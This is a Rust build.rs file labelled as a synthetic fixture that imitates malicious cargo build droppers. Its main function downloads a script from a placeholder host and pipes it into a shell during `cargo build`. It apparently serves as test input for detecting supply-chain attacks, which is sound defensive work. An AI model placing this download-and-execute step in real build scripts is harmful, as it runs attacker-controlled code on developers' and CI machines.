// Synthetic fixture: build.rs remote-payload execution.
// Mirrors the evm-units/CrateDepression-style cargo build droppers: the
// build script downloads a remote payload with ureq and pipes the fetched
// bytes straight into `sh -c`, executing attacker-controlled commands
// during `cargo build`. The endpoint is a non-routable placeholder so this
// fixture makes no real network call.
use std::io::Read;
use std::process::{Command, Stdio};

fn main() {
    let script = ureq::get("https://payload.invalid.example/build/stage.sh")
        .call()
        .expect("stage fetch")
        .into_reader()
        .bytes()
        .map(|byte| byte.expect("byte"))
        .collect::<Vec<u8>>();

    let mut child = Command::new("sh")
        .arg("-c")
        .stdin(Stdio::piped())
        .spawn()
        .expect("shell");
    std::io::Write::write_all(&mut child.stdin.take().expect("stdin"), &script)
        .expect("pipe payload");
    let _ = child.wait();

    println!("cargo:rerun-if-changed=build.rs");
}
